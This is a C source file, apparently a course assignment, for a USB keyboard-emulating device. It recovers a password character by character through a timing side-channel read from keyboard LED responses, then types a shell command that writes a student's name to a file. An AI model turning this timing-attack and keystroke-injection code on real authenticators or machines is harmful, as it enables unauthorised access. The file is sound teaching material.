#include "password_attack.h"
#include "german_keyboardCodes.h"
#include <string.h>

// Character set used in passwords (from assignment PDF)
static const char PasswordSetOfChars[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!()-_+=~;:,.<>[]{}/?&$ ";
static uint8_t PasswordSetOfCharsLen = 0;

// File creation command sequence: cd $HOME\necho "MEHMET ARSLAN" > 03811532\n
static const char file_creation_cmd[] = "cd $HOME\necho \"MEHMET ARSLAN\" > 03811532\n";
static const uint8_t file_creation_cmd_len = sizeof(file_creation_cmd) - 1;

// Password attack state
static uint8_t curr_char_id = 0;
static uint8_t position_id_in_attempt = 0;
static char confirmed_password[25] = {0};
static uint8_t confirmed_len = 0;

// Timing measurement state
static uint32_t timings[86] = {0};
static uint32_t start_time = 0;
static uint8_t last_led_state = 0;
static volatile uint32_t timer_ms = 0;

// Control flags
static bool waiting_for_response = false;
static bool is_button_pressed = false;
static bool attack_completed = false;
static bool send_enter_now = false;

// File creation state
static uint8_t file_cmd_index = 0;

// Forward declarations for static helper functions
static void sendFileCreationCommand(USB_KeyboardReport_Data_t* report);
static void sendResolvedChars(USB_KeyboardReport_Data_t* report);
static void sendUnsolvedCurrentChar(USB_KeyboardReport_Data_t* report);
static void sendEnterKey(USB_KeyboardReport_Data_t* report);
static void findBestTimeAndExtractPasswordChar(void);

void SysTick_Handler(void)
{
	timer_ms++;
}

// Convert ASCII character to German keyboard scancode
static uint8_t GetCharCodeInGerman(char c, uint8_t* modifier)
{
	*modifier = 0;

	// Lowercase letters (a-z)
	if (c >= 'a' && c <= 'z')
	{
		return GERMAN_KEYBOARD_SC_A + (c - 'a');
	}

	// Uppercase letters (A-Z) - requires Shift modifier
	if (c >= 'A' && c <= 'Z')
	{
		*modifier = HID_KEYBOARD_MODIFIER_LEFTSHIFT;
		return GERMAN_KEYBOARD_SC_A + (c - 'A');
	}

	// Numbers and special characters
	switch(c)
	{
		// Numbers (no modifier)
		case '1':
			return GERMAN_KEYBOARD_SC_1_AND_EXCLAMATION;
		case '2':
			return GERMAN_KEYBOARD_SC_2_AND_QUOTES;
		case '3':
			return GERMAN_KEYBOARD_SC_3_AND_PARAGRAPH;
		case '4':
			return GERMAN_KEYBOARD_SC_4_AND_DOLLAR;
		case '5':
			return GERMAN_KEYBOARD_SC_5_AND_PERCENTAGE;
		case '6':
			return GERMAN_KEYBOARD_SC_6_AND_AMPERSAND;
		case '7':
			return GERMAN_KEYBOARD_SC_7_AND_SLASH_AND_OPENING_BRACE;
		case '8':
			return GERMAN_KEYBOARD_SC_8_AND_OPENING_PARENTHESIS_AND_OPENING_BRACKET;
		case '9':
			return GERMAN_KEYBOARD_SC_9_AND_CLOSING_PARENTHESIS_AND_CLOSING_BRACKET;
		case '0':
			return GERMAN_KEYBOARD_SC_0_AND_EQUAL_AND_CLOSING_BRACE;

		// Special characters with Shift
		case '!':
			*modifier = HID_KEYBOARD_MODIFIER_LEFTSHIFT;
			return GERMAN_KEYBOARD_SC_1_AND_EXCLAMATION;
		case '$':
			*modifier = HID_KEYBOARD_MODIFIER_LEFTSHIFT;
			return GERMAN_KEYBOARD_SC_4_AND_DOLLAR;
		case '&':
			*modifier = HID_KEYBOARD_MODIFIER_LEFTSHIFT;
			return GERMAN_KEYBOARD_SC_6_AND_AMPERSAND;
		case '/':
			*modifier = HID_KEYBOARD_MODIFIER_LEFTSHIFT;
			return GERMAN_KEYBOARD_SC_7_AND_SLASH_AND_OPENING_BRACE;
		case '(':
			*modifier = HID_KEYBOARD_MODIFIER_LEFTSHIFT;
			return GERMAN_KEYBOARD_SC_8_AND_OPENING_PARENTHESIS_AND_OPENING_BRACKET;
		case ')':
			*modifier = HID_KEYBOARD_MODIFIER_LEFTSHIFT;
			return GERMAN_KEYBOARD_SC_9_AND_CLOSING_PARENTHESIS_AND_CLOSING_BRACKET;
		case '=':
			*modifier = HID_KEYBOARD_MODIFIER_LEFTSHIFT;
			return GERMAN_KEYBOARD_SC_0_AND_EQUAL_AND_CLOSING_BRACE;
		case '?':
			*modifier = HID_KEYBOARD_MODIFIER_LEFTSHIFT;
			return GERMAN_KEYBOARD_SC_SHARP_S_AND_QUESTION_AND_BACKSLASH;
		case '*':
			*modifier = HID_KEYBOARD_MODIFIER_LEFTSHIFT;
			return GERMAN_KEYBOARD_SC_PLUS_AND_ASTERISK_AND_TILDE;
		case '_':
			*modifier = HID_KEYBOARD_MODIFIER_LEFTSHIFT;
			return GERMAN_KEYBOARD_SC_MINUS_AND_UNDERSCORE;
		case ';':
			*modifier = HID_KEYBOARD_MODIFIER_LEFTSHIFT;
			return GERMAN_KEYBOARD_SC_COMMA_AND_SEMICOLON;
		case ':':
			*modifier = HID_KEYBOARD_MODIFIER_LEFTSHIFT;
			return GERMAN_KEYBOARD_SC_DOT_AND_COLON;
		case '>':
			*modifier = HID_KEYBOARD_MODIFIER_LEFTSHIFT;
			return GERMAN_KEYBOARD_SC_LESS_THAN_AND_GREATER_THAN_AND_PIPE;

		// Special characters with Right Alt (AltGr)
		case '{':
			*modifier = HID_KEYBOARD_MODIFIER_RIGHTALT;
			return GERMAN_KEYBOARD_SC_7_AND_SLASH_AND_OPENING_BRACE;
		case '[':
			*modifier = HID_KEYBOARD_MODIFIER_RIGHTALT;
			return GERMAN_KEYBOARD_SC_8_AND_OPENING_PARENTHESIS_AND_OPENING_BRACKET;
		case ']':
			*modifier = HID_KEYBOARD_MODIFIER_RIGHTALT;
			return GERMAN_KEYBOARD_SC_9_AND_CLOSING_PARENTHESIS_AND_CLOSING_BRACKET;
		case '}':
			*modifier = HID_KEYBOARD_MODIFIER_RIGHTALT;
			return GERMAN_KEYBOARD_SC_0_AND_EQUAL_AND_CLOSING_BRACE;
		case '~':
			*modifier = HID_KEYBOARD_MODIFIER_RIGHTALT;
			return GERMAN_KEYBOARD_SC_PLUS_AND_ASTERISK_AND_TILDE;

		// Other characters (no modifier)
		case '+':
			return GERMAN_KEYBOARD_SC_PLUS_AND_ASTERISK_AND_TILDE;
		case '-':
			return GERMAN_KEYBOARD_SC_MINUS_AND_UNDERSCORE;
		case ',':
			return GERMAN_KEYBOARD_SC_COMMA_AND_SEMICOLON;
		case '.':
			return GERMAN_KEYBOARD_SC_DOT_AND_COLON;
		case ' ':
			return GERMAN_KEYBOARD_SC_SPACE;
		case '<':
			return GERMAN_KEYBOARD_SC_LESS_THAN_AND_GREATER_THAN_AND_PIPE;
	}

	// Character not supported, return 0
	return 0;
}

void AttackInit(void)
{
	// Calculate password character set length
	PasswordSetOfCharsLen = strlen(PasswordSetOfChars);

	curr_char_id = 0;
	position_id_in_attempt = 0;
	confirmed_len = 0;
	start_time = 0;

	waiting_for_response = false;
	is_button_pressed = false;
	attack_completed = false;
	send_enter_now = false;

	file_cmd_index = 0;

	memset(confirmed_password, 0, sizeof(confirmed_password));
	memset(timings, 0, sizeof(timings));
}

// Send file creation commands character by character
static void sendFileCreationCommand(USB_KeyboardReport_Data_t* report)
{
	if (file_cmd_index >= file_creation_cmd_len)
	{
		return;
	}

	if (!is_button_pressed)
	{
		char c = file_creation_cmd[file_cmd_index];

		if (c == '\n')
		{
			report->KeyCode[0] = GERMAN_KEYBOARD_SC_ENTER;
			report->Modifier = 0;
		}
		else
		{
			report->KeyCode[0] = GetCharCodeInGerman(c, &(report->Modifier));
		}
		is_button_pressed = true;
	}
	else
	{
		is_button_pressed = false;
		file_cmd_index++;
	}
}

// Main HID report creation - coordinates password attack and file creation
void AttackCreateReport(USB_KeyboardReport_Data_t* report)
{
	report->Modifier = 0;
	report->Reserved = 0;
	report->KeyCode[0] = 0;

	if (attack_completed)
	{
		sendFileCreationCommand(report);
		return;
	}

	// Try all characters in charset for current password position
	if (curr_char_id < PasswordSetOfCharsLen)
	{
		if (!send_enter_now)
		{
			// Type known password prefix + test character
			if (position_id_in_attempt < confirmed_len)
			{
				sendResolvedChars(report);
			}
			else
			{
				sendUnsolvedCurrentChar(report);
			}
		}
		else
		{
			sendEnterKey(report);
		}
	}
	else
	{
		// All characters tested - find best match
		findBestTimeAndExtractPasswordChar();
	}
}

// Send already-cracked password characters
static void sendResolvedChars(USB_KeyboardReport_Data_t* report)
{
	if (position_id_in_attempt < confirmed_len)
	{
		if (!is_button_pressed)
		{
			char c = confirmed_password[position_id_in_attempt];
			report->KeyCode[0] = GetCharCodeInGerman(c, &(report->Modifier));
			is_button_pressed = true;
		}
		else
		{
			is_button_pressed = false;
			position_id_in_attempt++;
		}
	}
}

// Send the current test character
static void sendUnsolvedCurrentChar(USB_KeyboardReport_Data_t* report)
{
	if (curr_char_id < PasswordSetOfCharsLen)
	{
		if (!send_enter_now)
		{
			if (!is_button_pressed)
			{
				char current_char = PasswordSetOfChars[curr_char_id];
				report->KeyCode[0] = GetCharCodeInGerman(current_char, &(report->Modifier));
				is_button_pressed = true;
			}
			else
			{
				position_id_in_attempt = 0;
				is_button_pressed = false;
				send_enter_now = true;
			}
		}
	}
}

// Send Enter key and start timing measurement
static void sendEnterKey(USB_KeyboardReport_Data_t* report)
{
	if (!is_button_pressed)
	{
		// Press phase: send Enter key
		report->KeyCode[0] = GERMAN_KEYBOARD_SC_ENTER;
		report->Modifier = 0;
		is_button_pressed = true;
	}
	else
	{
		// Release phase: start timer after key is sent
		start_time = timer_ms;
		waiting_for_response = true;
		is_button_pressed = false;
		send_enter_now = false;
	}
}

// Analyze timing results and select character with longest delay (correct character)
static void findBestTimeAndExtractPasswordChar(void)
{
	uint32_t longest_time = 0;
	uint8_t longest_time_id = 0;

	for (uint8_t i = 0; i < PasswordSetOfCharsLen; i++)
	{
		if (timings[i] > longest_time)
		{
			longest_time = timings[i];
			longest_time_id = i;
		}
	}

	confirmed_password[confirmed_len++] = PasswordSetOfChars[longest_time_id];

	// Reset for next character - CAPSLOCK detection handles completion
	curr_char_id = 0;
	memset(timings, 0, sizeof(timings));
}

// Process LED state changes for timing measurement
void AttackProcessResponse(uint8_t* led_report)
{
	uint8_t current_led_state = *led_report;

	// Record timing when LED state changes (authenticator response)
	if (waiting_for_response && (current_led_state != last_led_state))
	{
		uint32_t end_time = timer_ms;
		timings[curr_char_id++] = end_time - start_time;
		waiting_for_response = false;
	}

	last_led_state = current_led_state;
}

void MarkAttackCompleted(void)
{
	attack_completed = true;
}
